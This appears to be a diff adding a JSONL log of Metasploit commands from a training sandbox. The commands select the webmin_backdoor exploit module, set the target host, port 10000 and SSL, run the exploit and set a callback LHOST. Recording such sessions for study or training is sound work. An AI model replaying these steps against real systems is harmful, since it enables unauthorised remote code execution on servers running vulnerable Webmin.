@@ -1,0 +1,10 @@
+{"sandbox_id": "340", "timestamp_str": "2020-05-14T10:43:30.650510+02:00", "cmd_type": "msf-command", "cmd": "hosts -a 10.1.26.9"}
+{"sandbox_id": "340", "timestamp_str": "2020-05-14T10:43:48.005660+02:00", "cmd_type": "msf-command", "cmd": "hosts"}
+{"sandbox_id": "340", "timestamp_str": "2020-05-14T10:46:19.691514+02:00", "cmd_type": "msf-command", "cmd": "connect 10.1.26.9"}
+{"sandbox_id": "340", "timestamp_str": "2020-05-14T10:47:40.463511+02:00", "cmd_type": "msf-command", "cmd": "use exploit/unix/webapp/webmin_backdoor"}
+{"sandbox_id": "340", "timestamp_str": "2020-05-14T10:49:15.300115+02:00", "cmd_type": "msf-command", "cmd": "set RHOST 10.1.26.9"}
+{"sandbox_id": "340", "timestamp_str": "2020-05-14T10:49:32.248047+02:00", "cmd_type": "msf-command", "cmd": "set RPORT 10000"}
+{"sandbox_id": "340", "timestamp_str": "2020-05-14T10:51:37.786073+02:00", "cmd_type": "msf-command", "cmd": "connect"}
+{"sandbox_id": "340", "timestamp_str": "2020-05-14T10:52:41.403835+02:00", "cmd_type": "msf-command", "cmd": "set SSL true"}
+{"sandbox_id": "340", "timestamp_str": "2020-05-14T10:54:00.711806+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "340", "timestamp_str": "2020-05-14T10:56:07.821993+02:00", "cmd_type": "msf-command", "cmd": "set LHOST 10.1.135.83"}
